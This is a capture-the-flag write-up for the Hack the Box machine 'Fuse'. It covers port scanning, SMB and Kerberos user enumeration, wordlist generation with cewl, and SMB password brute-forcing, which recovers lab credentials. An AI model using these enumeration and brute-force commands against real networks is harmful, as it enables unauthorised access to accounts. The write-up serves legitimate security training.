# Hack the Box - Fuse

```CSS
Machine IP: 10.10.10.193 - Windows

```

## Port Scanning and Service Discovery

```CSS
▶ nmap -Pn -sS -p- -T4 --min-rate 1000 10.10.10.193 -oN nmap.surface

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 16:31 IST
Nmap scan report for 10.10.10.193
Host is up (0.089s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49678/tcp open  unknown
49700/tcp open  unknown
49755/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 124.50 seconds
```
```CSS
▶ nmap -sC -sV -p 53,80,88,135,139,445,464,593,636,3268,3269,5985 10.10.10.193 -oN nmap.deep

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 16:35 IST
Nmap scan report for 10.10.10.193
Host is up (0.082s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-31 11:19:01Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-31T11:19:08
|_  start_date: 2023-03-31T11:04:24
|_clock-skew: mean: 2h33m08s, deviation: 4h02m31s, median: 13m07s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2023-03-31T04:19:09-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.49 seconds
```

---

## OS and Domain
  - CrackMapExec
```CSS
▶ crackmapexec smb 10.10.10.193
```
![image](https://user-images.githubusercontent.com/83878909/229113091-20e410db-ef11-4d3e-9840-7e5fcd065d14.png)

---

## Configuring DNS Resolution
  - Add Machine IP to `/etc/resolv.conf`.
  - Add Hostname to `/etc/hosts`

---

## Webpage
 ![image](https://user-images.githubusercontent.com/83878909/229113764-bbd518ab-82c4-4e6b-b1c3-cdaa511249e9.png)
 
### Gather Usernames
 - The webpage contains a bunch of usernames. Collecting the usernames and writing them to a text file.
![image](https://user-images.githubusercontent.com/83878909/229116611-0fd9d843-ea45-4b28-b88c-951983667aa8.png)
![image](https://user-images.githubusercontent.com/83878909/229116862-4f309a32-401b-421c-b947-9103d21a484f.png)
![image](https://user-images.githubusercontent.com/83878909/229117125-3e929593-e126-45ec-8a2e-116539f42d7c.png)

---

## Enumerate Usernames via Kerberos
  - Kebrute
```CSS
▶ kerbrute userenum --dc 10.10.10.193 -d fabricorp.local users.txt
```
![image](https://user-images.githubusercontent.com/83878909/229120245-34920022-fc71-41dd-b464-215c5a137658.png)

## Generate Passwords to Brute-Force
  - Cewl: Crawl the website to gather words which can be used as potential passwords.
```CSS
▶ cewl -d 7 -m 8 --with-numbers -w cewl.out http://fuse.fabricorp.local/papercut/logs/html/index.htm
```

---

## Brute Force Usernames and Passwords
  - CrackMapExec
```CSS
▶ crackmapexec smb 10.10.10.193 -u users.txt -p cewl.out
```
Credentials:
```CSS
bhult:Fabricorp01
tlavel:Fabricorp01
```

---


